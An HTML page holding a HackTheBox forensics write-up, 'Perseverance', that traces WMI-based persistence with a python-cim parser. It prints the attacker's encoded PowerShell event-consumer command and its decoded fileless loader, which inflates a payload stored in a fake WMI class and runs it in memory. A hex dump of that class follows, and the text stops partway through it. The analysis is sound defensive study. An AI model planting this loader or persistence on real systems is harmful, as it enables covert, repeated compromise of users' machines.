<!DOCTYPE html>
<!--
==============================================================================
                GitHub HTML Pandoc Template — by Apehex
==============================================================================
Copyright (c) Apehex, 2021, MIT License (MIT).

- https://github.com/apehex/homesick

Forked from "pandoc-goodies" by Tristano Ajmone:

- https://github.com/tajmone/pandoc-goodies

The CSS in this template reuses source code taken from the following projects:

- GitHub Markdown CSS: Copyright © Sindre Sorhus, MIT License (MIT):
  https://github.com/sindresorhus/github-markdown-css

- Primer CSS: Copyright © 2016-2017 GitHub Inc., MIT License (MIT):
  http://primercss.io/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
The MIT License

Copyright (c) Apehex, 2021 (github.com/apehex/homesick)
Copyright (c) Tristano Ajmone, 2017-2020 (github.com/tajmone/pandoc-goodies)
Copyright (c) Sindre Sorhus <sindresorhus@gmail.com> (sindresorhus.com)
Copyright (c) 2017 GitHub Inc.

"GitHub Pandoc HTML5 Template" is Copyright (c) Tristano Ajmone, 2017-2020,
released under the MIT License (MIT); it contains readaptations of substantial
portions of the following third party softwares:

(1) "GitHub Markdown CSS", Copyright (c) Sindre Sorhus, MIT License (MIT).
(2) "Primer CSS", Copyright (c) 2016 GitHub Inc., MIT License (MIT).

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
==============================================================================-->
<html>
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title> Perseverance</title>
  <style type="text/css">
@charset "UTF-8";.markdown-body{-webkit-print-color-adjust: exact;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%;color: #24292e;font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI",Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji","Segoe UI Symbol";font-size: 16px;line-height: 1.5;word-wrap: break-word;box-sizing: border-box;min-width: 200px;max-width: 96%;margin: 0 auto;padding: 45px}.markdown-body a{color: #0366d6;background-color: transparent;text-decoration: none;-webkit-text-decoration-skip: objects}.markdown-body a:active,.markdown-body a:hover{outline-width: 0}.markdown-body a:hover{text-decoration: underline}.markdown-body a:not([href]){color: inherit;text-decoration: none}.markdown-body strong{font-weight: 600}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top: 24px;margin-bottom: 16px;font-weight: 600;line-height: 1.25}.markdown-body h1{font-size: 2em;margin: 0.67em 0;padding-bottom: 0.3em;border-bottom: 1px solid #eaecef}.markdown-body h2{padding-bottom: 0.3em;font-size: 1.5em;border-bottom: 1px solid #eaecef}.markdown-body h3{font-size: 1.25em}.markdown-body h4{font-size: 1em}.markdown-body h5{font-size: 0.875em}.markdown-body h6{font-size: 0.85em;color: #6a737d}.markdown-body img{border-style: none}.markdown-body svg:not(:root){overflow: hidden}.markdown-body hr{box-sizing: content-box;height: 0.25em;margin: 24px 0;padding: 0;overflow: hidden;background-color: #e1e4e8;border: 0}.markdown-body hr::before{display: table;content: ""}.markdown-body hr::after{display: table;clear: both;content: ""}.markdown-body input{margin: 0;overflow: visible;font: inherit;font-family: inherit;font-size: inherit;line-height: inherit}.markdown-body [type="checkbox"]{box-sizing: border-box;padding: 0}.markdown-body *{box-sizing: border-box}.markdown-body blockquote{margin: 0}.markdown-body ol,.markdown-body ul{padding-left: 2em}.markdown-body ol ol,.markdown-body ul ol{list-style-type: lower-roman}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top: 0;margin-bottom: 0}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type: lower-alpha}.markdown-body li > p{margin-top: 16px}.markdown-body li li{margin-top: 0.25em}.markdown-body dd{margin-left: 0}.markdown-body dl{padding: 0}.markdown-body dl dt{padding: 0;margin-top: 16px;font-size: 1em;font-style: italic;font-weight: 600}.markdown-body dl dd{padding: 0 16px;margin-bottom: 16px}.markdown-body code{font-family: SFMono-Regular, Consolas, "Liberation Mono", Menlo, Courier,monospace}.markdown-body pre{font: 12px SFMono-Regular, Consolas, "Liberation Mono", Menlo, Courier,monospace;word-wrap: normal}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top: 0;margin-bottom: 16px}.markdown-body blockquote{padding: 0 1em;color: #6a737d;border-left: 0.25em solid #dfe2e5}.markdown-body blockquote > :first-child{margin-top: 0}.markdown-body blockquote > :last-child{margin-bottom: 0}.markdown-body table{display: block;width: 100%;overflow: auto;border-spacing: 0;border-collapse: collapse}.markdown-body table th{font-weight: 600}.markdown-body table td,.markdown-body table th{padding: 6px 13px;border: 1px solid #dfe2e5}.markdown-body table tr{background-color: #fff;border-top: 1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color: #f6f8fa}.markdown-body img{max-width: 100%;box-sizing: content-box;background-color: #fff}.markdown-body code{padding: 0.2em 0;margin: 0;font-size: 85%;background-color: rgba(27, 31, 35, 0.05);border-radius: 3px}.markdown-body code::after,.markdown-body code::before{letter-spacing: -0.2em;content: " "}.markdown-body pre > code{padding: 0;margin: 0;font-size: 100%;word-break: normal;white-space: pre;background: 0 0;border: 0}.markdown-body .highlight{margin-bottom: 16px}.markdown-body .highlight pre{margin-bottom: 0;word-break: normal}.markdown-body .highlight pre,.markdown-body pre{padding: 16px;overflow: auto;font-size: 85%;line-height: 1.45;background-color: #f6f8fa;border-radius: 3px}.markdown-body pre code{display: inline;max-width: auto;padding: 0;margin: 0;overflow: visible;line-height: inherit;word-wrap: normal;background-color: transparent;border: 0}.markdown-body pre code::after,.markdown-body pre code::before{content: normal}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color: #005cc5;border-color: #005cc5}.markdown-body kbd{box-shadow: inset 0 -1px 0 #959da5;display: inline-block;padding: 3px 5px;font: 11px/10px SFMono-Regular, Consolas, "Liberation Mono", Menlo, Courier,monospace;color: #444d56;vertical-align: middle;background-color: #fcfcfc;border: 1px solid #c6cbd1;border-bottom-color: #959da5;border-radius: 3px;box-shadow: inset 0 -1px 0 #959da5}.markdown-body :checked .radio-label{position: relative;z-index: 1;border-color: #0366d6}.markdown-body .task-list-item{list-style-type: none}.markdown-body .task-list-item .task-list-item{margin-top: 3px}.markdown-body .task-list-item input{margin: 0 0.2em 0.25em -1.6em;vertical-align: middle}.markdown-body::before{display: table;content: ""}.markdown-body::after{display: table;clear: both;content: ""}.markdown-body > :first-child{margin-top: 0 !important}.markdown-body > :last-child{margin-bottom: 0 !important}.Alert,.Error,.Note,.Success,.Warning{padding: 11px;margin-bottom: 24px;border-style: solid;border-width: 1px;border-radius: 4px}.Alert p,.Error p,.Note p,.Success p,.Warning p{margin-top: 0}.Alert p:last-child,.Error p:last-child,.Note p:last-child,.Success p:last-child,.Warning p:last-child{margin-bottom: 0}.Alert{color: #246;background-color: #e2eef9;border-color: #bac6d3}.Warning{color: #4c4a42;background-color: #fff9ea;border-color: #dfd8c2}.Error{color: #911;background-color: #fcdede;border-color: #d2b2b2}.Success{color: #22662c;background-color: #e2f9e5;border-color: #bad3be}.Note{color: #2f363d;background-color: #f6f8fa;border-color: #d5d8da}.Alert h1,.Alert h2,.Alert h3,.Alert h4,.Alert h5,.Alert h6{color: #246;margin-bottom: 0}.Warning h1,.Warning h2,.Warning h3,.Warning h4,.Warning h5,.Warning h6{color: #4c4a42;margin-bottom: 0}.Error h1,.Error h2,.Error h3,.Error h4,.Error h5,.Error h6{color: #911;margin-bottom: 0}.Success h1,.Success h2,.Success h3,.Success h4,.Success h5,.Success h6{color: #22662c;margin-bottom: 0}.Note h1,.Note h2,.Note h3,.Note h4,.Note h5,.Note h6{color: #2f363d;margin-bottom: 0}.Alert h1:first-child,.Alert h2:first-child,.Alert h3:first-child,.Alert h4:first-child,.Alert h5:first-child,.Alert h6:first-child,.Error h1:first-child,.Error h2:first-child,.Error h3:first-child,.Error h4:first-child,.Error h5:first-child,.Error h6:first-child,.Note h1:first-child,.Note h2:first-child,.Note h3:first-child,.Note h4:first-child,.Note h5:first-child,.Note h6:first-child,.Success h1:first-child,.Success h2:first-child,.Success h3:first-child,.Success h4:first-child,.Success h5:first-child,.Success h6:first-child,.Warning h1:first-child,.Warning h2:first-child,.Warning h3:first-child,.Warning h4:first-child,.Warning h5:first-child,.Warning h6:first-child{margin-top: 0}h1.title,p.subtitle{text-align: center}h1.title.followed-by-subtitle{margin-bottom: 0}p.subtitle{font-size: 1.5em;font-weight: 600;line-height: 1.25;margin-top: 0;margin-bottom: 16px;padding-bottom: 0.3em}div.line-block{white-space: pre-line}
  </style>
  <style type="text/css">code{white-space: pre;}</style>
  <style type="text/css">
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    color: #aaaaaa;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ff0000; font-weight: bold; } /* Alert */
code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { color: #7d9029; } /* Attribute */
code span.bn { color: #40a070; } /* BaseN */
code span.bu { color: #008000; } /* BuiltIn */
code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
code span.ch { color: #4070a0; } /* Char */
code span.cn { color: #880000; } /* Constant */
code span.co { color: #60a0b0; font-style: italic; } /* Comment */
code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
code span.do { color: #ba2121; font-style: italic; } /* Documentation */
code span.dt { color: #902000; } /* DataType */
code span.dv { color: #40a070; } /* DecVal */
code span.er { color: #ff0000; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #40a070; } /* Float */
code span.fu { color: #06287e; } /* Function */
code span.im { color: #008000; font-weight: bold; } /* Import */
code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #007020; font-weight: bold; } /* Keyword */
code span.op { color: #666666; } /* Operator */
code span.ot { color: #007020; } /* Other */
code span.pp { color: #bc7a00; } /* Preprocessor */
code span.sc { color: #4070a0; } /* SpecialChar */
code span.ss { color: #bb6688; } /* SpecialString */
code span.st { color: #4070a0; } /* String */
code span.va { color: #19177c; } /* Variable */
code span.vs { color: #4070a0; } /* VerbatimString */
code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
  </style>
  <!--[if lt IE 9]>
    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
</head>
<body>
<article class="markdown-body">
<header>
<h1 class="title"> Perseverance</h1>
</header>
<blockquote>
<p>During a recent security assessment of a well-known consulting
company, the competent team found some employees’ credentials in
publicly available breach databases. Thus, they called us to trace down
the actions performed by these users. During the investigation, it
turned out that one of them had been compromised. Although their
security engineers took the necessary steps to remediate and secure the
user and the internal infrastructure, the user was getting compromised
repeatedly. Narrowing down our investigation to find possible
persistence mechanisms, we are confident that the malicious actors use
WMI to establish persistence. You are given the WMI repository of the
user’s workstation. Can you analyze and expose their technique?</p>
</blockquote>
<blockquote>
<p>Author: <strong><a
href="https://app.hackthebox.com/users/70891">thewildspirit</a></strong></p>
</blockquote>
<h2 id="parsing-the-repository">Parsing the repository</h2>
<p>This was the hardest for me!</p>
<p>The Powershell commands, command line utilities and other Windows
tools all work on the default repository:</p>
<pre><code>%windir%\System32\wbem\Repository</code></pre>
<p>So to load the given files I’d have to backup / replace this folder
with unknown implications…</p>
<p>The Powershell commands looked promising too:</p>
<pre class="shell"><code>Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</code></pre>
<p>Browsing Google I found the SANS course <a
href="https://www.youtube.com/watch?v=aBQ1vEjK6v4">FOR508</a> and
several parsers, especially <a
href="https://github.com/mandiant/flare-wmi/tree/master/python-cim">Python-CIM</a>
from Mandiant.</p>
<h2 id="the-consumer-bindings">The consumer bindings</h2>
<p>The key element is the “consumer binding” which contains the action
to take in response to a given event.</p>
<p>The parser previously mentioned has a built-in filter to retrieve
this class from the repository:</p>
<div class="sourceCode" id="cb3"><pre
class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>c <span class="op">=</span> CIM(<span class="st">&#39;win7&#39;</span>, <span class="st">&#39;.&#39;</span>)</span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> Namespace(c, <span class="st">&quot;root</span><span class="ch">\\</span><span class="st">subscription&quot;</span>) <span class="im">as</span> ns:</span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> binding <span class="kw">in</span> ns.class_(<span class="st">&quot;__filtertoconsumerbinding&quot;</span>).instances:</span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(<span class="st">&quot;binding: &quot;</span>, binding)</span></code></pre></div>
<p>It extracts the relevants keys from the binding and does find the
persistent malware in the WMI files:</p>
<pre class="shell"><code>cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAnAFIATwBPAFQAXABjAGkAbQB2ADIAOgBXAGkAbgAzADIAXwBNAGUAbQBvAHIAeQBBAHIAcgBhAHkARABlAHYAaQBjAGUAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAUAByAG8AcABlAHIAdAB5ACcAXQAuAFYAYQBsAHUAZQA7AHMAdgAgAG8AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQApADsAcwB2ACAAZAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKABbAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGYAaQBsAGUAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAOwBzAHYAIABiACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AKAAxADAAMgA0ACkAKQA7AHMAdgAgAHIAIAAoAGcAdgAgAGQAKQAuAFYAYQBsAHUAZQAuAFIAZQBhAGQAKAAoAGcAdgAgAGIAKQAuAFYAYQBsAHUAZQAsADAALAAxADAAMgA0ACkAOwB3AGgAaQBsAGUAKAAoAGcAdgAgAHIAKQAuAFYAYQBsAHUAZQAgAC0AZwB0ACAAMAApAHsAKABnAHYAIABvACkALgBWAGEAbAB1AGUALgBXAHIAaQB0AGUAKAAoAGcAdgAgAGIAKQAuAFYAYQBsAHUAZQAsADAALAAoAGcAdgAgAHIAKQAuAFYAYQBsAHUAZQApADsAcwB2ACAAcgAgACgAZwB2ACAAZAApAC4AVgBhAGwAdQBlAC4AUgBlAGEAZAAoACgAZwB2ACAAYgApAC4AVgBhAGwAdQBlACwAMAAsADEAMAAyADQAKQA7AH0AWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAoAGcAdgAgAG8AKQAuAFYAYQBsAHUAZQAuAFQAbwBBAHIAcgBhAHkAKAApACkALgBFAG4AdAByAHkAUABvAGkAbgB0AC4ASQBuAHYAbwBrAGUAKAAwACwAQAAoACwAWwBzAHQAcgBpAG4AZwBbAF0AXQBAACgAKQApACkAfABPAHUAdAAtAE4AdQBsAGwA</code></pre>
<p>It decodes to:</p>
<pre class="shell"><code>echo -n JABmAGkAbABlACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAnAFIATwBPAFQAXABjAGkAbQB2ADIAOgBXAGkAbgAzADIAXwBNAGUAbQBvAHIAeQBBAHIAcgBhAHkARABlAHYAaQBjAGUAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAUAByAG8AcABlAHIAdAB5ACcAXQAuAFYAYQBsAHUAZQA7AHMAdgAgAG8AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQApADsAcwB2ACAAZAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEQAZQBmAGwAYQB0AGUAUwB0AHIAZQBhAG0AKABbAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAF0AWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGYAaQBsAGUAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAOwBzAHYAIABiACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AKAAxADAAMgA0ACkAKQA7AHMAdgAgAHIAIAAoAGcAdgAgAGQAKQAuAFYAYQBsAHUAZQAuAFIAZQBhAGQAKAAoAGcAdgAgAGIAKQAuAFYAYQBsAHUAZQAsADAALAAxADAAMgA0ACkAOwB3AGgAaQBsAGUAKAAoAGcAdgAgAHIAKQAuAFYAYQBsAHUAZQAgAC0AZwB0ACAAMAApAHsAKABnAHYAIABvACkALgBWAGEAbAB1AGUALgBXAHIAaQB0AGUAKAAoAGcAdgAgAGIAKQAuAFYAYQBsAHUAZQAsADAALAAoAGcAdgAgAHIAKQAuAFYAYQBsAHUAZQApADsAcwB2ACAAcgAgACgAZwB2ACAAZAApAC4AVgBhAGwAdQBlAC4AUgBlAGEAZAAoACgAZwB2ACAAYgApAC4AVgBhAGwAdQBlACwAMAAsADEAMAAyADQAKQA7AH0AWwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKAAoAGcAdgAgAG8AKQAuAFYAYQBsAHUAZQAuAFQAbwBBAHIAcgBhAHkAKAApACkALgBFAG4AdAByAHkAUABvAGkAbgB0AC4ASQBuAHYAbwBrAGUAKAAwACwAQAAoACwAWwBzAHQAcgBpAG4AZwBbAF0AXQBAACgAKQApACkAfABPAHUAdAAtAE4AdQBsAGwA | base64 -d
# $file = ([WmiClass]&#39;ROOT\cimv2:Win32_MemoryArrayDevice&#39;).Properties[&#39;Property&#39;].Value;sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null(wmi-D79jIcjc-py3.10)</code></pre>
<pre class="shell"><code>$file = ([WmiClass]&#39;ROOT\cimv2:Win32_MemoryArrayDevice&#39;).Properties[&#39;Property&#39;].Value;
sv o (New-Object IO.MemoryStream);
sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress));
sv b (New-Object Byte[](1024));
sv r (gv d).Value.Read((gv b).Value,0,1024);
while((gv r).Value -gt 0){
    (gv o).Value.Write((gv b).Value,0,(gv r).Value);
    sv r (gv d).Value.Read((gv b).Value,0,1024);}
[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null(wmi-D79jIcjc-py3.10)</code></pre>
<p>Looks like it is loading yet another encoded payload from another WMI
class.</p>
<h2 id="the-data-class">The data class</h2>
<p>Using another script from the Python-CIM parser, we can dump the
target class:</p>
<div class="sourceCode" id="cb7"><pre
class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>dump(<span class="st">&#39;win7&#39;</span>, <span class="st">&#39;.&#39;</span>, <span class="st">&#39;root</span><span class="ch">\\</span><span class="st">cimv2&#39;</span>, <span class="st">&#39;Win32_MemoryArrayDevice&#39;</span>)</span></code></pre></div>
<pre><code>classname: Win32_MemoryArrayDevice
super: 
ts: 2022-06-24T08:52:38.014666
qualifiers:
properties:
  name: Property
    type: CIM_TYPE_STRING
    index: 0
    level: 0
    offset: 0x0
    qualifiers:
      PROP_QUALIFIER_TYPE: string
layout:
  (0x0)   CIM_TYPE_STRING Property
================================================================================
keys:
================================================================================
00000000 (7226) ClassDefinition: ClassDefinition(name: Win32_MemoryArrayDevice)
00000000 (29)   header: ClassDefinitionHeader
00000000 (04)     super_class_unicode_length: 0x00000000 (0)
00000004 (00)     super_class_unicode: &#39;&#39;
00000004 (08)     timestamp: 2022-06-24T08:52:38.014666Z
0000000c (04)     data_length: 0x00001c1e (7198)
00000010 (01)     unk1: 0x00000000 (0)
00000011 (04)     offset_class_name: 0x00000000 (0)
00000015 (04)     property_default_values_length: 0x00000005 (5)
00000019 (04)     super_class_ascii_length: 0x00000004 (4)
0000001d (00)     super_class_ascii: &#39;&#39;
0000001d (00)     super_class_ascii_length2: &#39;&#39;
0000001d (04)   qualifiers_list: QualifiersList
0000001d (04)     size: 0x00000004 (4)
00000021 (00)     qualifiers: VArray
00000021 (12)   property_references: PropertyReferenceList
00000021 (04)     count: 0x00000001 (1)
00000025 (08)     refs: VArray
00000025 (08)       0: PropertyReference(isBuiltinKey: false, nameref: 0x19, structref: 0x23)
00000025 (04)         offset_property_name: 0x00000019 (25)
00000029 (04)         offset_property_struct: 0x00000023 (35)
0000002d (05)   property_default_values_data: 184a000000
00000032 (7160)   property_data: DataRegion
00000032 (04)     _size: 0x80001bf4 (2147490804)
00000036 (7156)     data: 0057696e33325f4d656d6f72794172726179446576696365000050726f706572747...
00001c2a (16)   method_data: DataRegion
00001c2a (04)     _size: 0x0000000c (12)
00001c2e (12)     data: 0000747a00000080</code></pre>
<p>Which results in another encoded string, this time it looks like pure
HEX:</p>
<pre class="shell"><code>echo -n 0057696e33325f4d656d6f72794172726179446576696365000050726f7065727479000800000000000000000000000000110000000a00008003080000004200000000737472696e6700003756703963467a5664542f333765376231647061363632736c53314c3874704339756f54666471573478684c736d514a4a47487277783855597139326e3654467133334c653775325a49385430375145536d67677a5265646b6753595470495a51734d454a694670533268497030374b6c41485343513068646a346d5a65415049503067744c48374f2f653958653161456954394a354f5a3750716465373775756565636538375675354a48623771585845546b786e506c43744858796637736f2f662b6e4d63543250794e4144316538757957723475525a37644d7a695773634e6f305a73336f664467575461574d544868614435765a5644695243752b2f635349386238543131744a532f7a574f6a594d4452434e436f51744e6a302f6e3746366b7262524774424531676c4273336e6548414d4a34546a6a656857325a32356d54473656547a68794639763070555a6e38747a546d422f6c5a674e306233793149724c66324e386a4673672f38387857515074424442585272526c2f495948777559757357786c7067346b53727153654e6d4f50444355656e75566876483148662f3864462f6a7a694f44556b5458766f6e317149766c4a464a4f796c314e2f573367346c676a6c2b4a59494e555274724c646852747947325457307176564d69375770574b5a682b7977733945335136676b543531336a4e4375414734397538356f45432f4751654e323848576e6e504a7469704432317566694143692f3449624453745663306e49447548576e61625831744e363450777a56336655726e74677834676c31554e6a6c6872494b302f7a354949496d36536971586d61367661384262624343375a3842625a4b48656243387071526e7a46527371586a50694b6a586a4d6453366b714a5354395333474173444b56664f5a46626865316678764e346831494d3568413979464e44654c56635a715074506c6f5852355355526a716a3559667a6b45513849497372574e454d6c55476d7779744e6c766c4c4f57337976466b66564d72444672324d4461534156547056707070524543707056754d43726c714b30784e6b6a45324d6a444771754b46514e6862676b4c366642623163785946366c683862715155597652324d79384d6b774b4d376373704a583965634c59776b784e43326961735a58526f4c61322b6836507a4b68576f766b6a6457412b5646397050672b50487172664946312f7148346a72467a442f745a4c635a576d4f64676d4c57686a6b57317372547a38426f6f3273683234656c6b4e3843354565466f44412b6c637558517267723152793965764c362b7766497856614257565269504c4b794a4e3748757a78493057316d316c787257635448616d504f517a326e69746262742b6762574332794c74544730506c5564326652534d45693169644c447976794b43534365773570316168626264366d4b5437707a305a3777762f2b35783973563876576962444253573276512b4f4e414e4b6d2b7857476e4a316c575464374177556e6d30504b4a464e4c6578452b52314d316575584745764e492f6d307a79535a2b78697349494275516447447a656f747230383949707232797363356d3477647066437a697542344c624c4958546d4a754e39344c30634b6d2f593957455a656350566b5864687a564175386f5a56493966384257463335384e7557504c4f30566979556a684e4274794167427530686c7a4168683177615057416e646b79576b3356316b663273506a3954486b6a714567314a48584c4b2b334371597a677a46614e765a4b6c5657707270553739526c7470513332566a577a634a4564746f39316156616a304b6c6e70736b776a3133465750442f364233517a326d714456444c323262335679304e56534b764b74636b6d625a323271644c6f59377a616273346172635a707a68716e4f57753061727335612b7a6d72444836755348744471323642376b58356257522f5379714e515a7344646d51745347744e7266535a72693565586c44796b35383536704f72436e75784d307264324c597a6c7134734e31433559314f6f54532b613645302f726146307268536f53786e326f585369454a703142702f5077726c66687a7a324f4c4351716c5a56696a4f4c6d39787871335975533268717367676937537444716256537350616c694c3750644a2b726e4a6b5857774e6156747a64564548722b70577159764c3731345864537658785456326b713470726f736d70793661337255756d6e3762756d6861715336574d2b323661454a644e476c4e767839316752656e3936364c79414557346c5851482f704c5931674f3636747965786a434871706e2b66304b6d38673769683138794c67655774746532566265484c6d426a5455624932796e314d5a484752396a6d336a4639722f4337376939492f5a376f67704450385234435350665033675266725639472b41646a472b4247626a7133664b4645767442586441364c747732467755562b5a3671755349484f63324b6971333271626d74586c744d42706e636b43504c684d75735a7549517079686f452b593168654a396857496d7a4b4643636278517a49535a4c4254665753686d77727933555078496f5a674a382f464338584f465969624d4878534972584869742b774a514c3831436268474e6159347876396770634d38625a503361705a78684d465241456569654a637035316e4c6c4d75574b356574716c7937584c6c325665586d3563724e717972765871363865376d79743746574f5973586148666a5673563154694c584b35466a6e4454724a69354c4c393950647376626975707947333845486c2f42797473555756386f50303178525734474f3473666e384b7674766763756c47315a786d3373464e59527a59616a2b75645562574e735331304774394e7455712f63706266774a7576555751507956505162733667322f67412b7958353868547a7138705a666e302f33717747334b484c574c79786c562f6431664e38573267636c4f65447932376c76665a616652505839776c356137507669716536577474614f39733632337449646c63533845583456666442334263522b7844367147346959795a5373785a7233416e7a512b4458545533516335583248626e75774e51773367506f49756a6e3448786458394c4958644a4269694d56443557552b454738497a6f705a4e385a65386d2b4e504c64467863486165634466465462655a41367a74315339723177526a666c72722f2f7139685271505367386946567061636c76456535525631486e2b4f3830302b386162644b78785747743376755158395030362f426638544e6e4c5071452b413854417a6e50417a37526470645232766b33443265744e74505833546436765854477438625870564d32506654547a317667504d444630744e482b4d6e704852492b53366b5033457a664e5237426462754a46346c356d483461656748364c76696945656c53656c4468592f3533356565484a58346154663738466543346230536674374c634b4f4c5066387a4b583147777338432b756b4236596d714d4c7a6f75674c4f39684c4776796f59376e4d7a584f746c474a47616273385767525546722f554c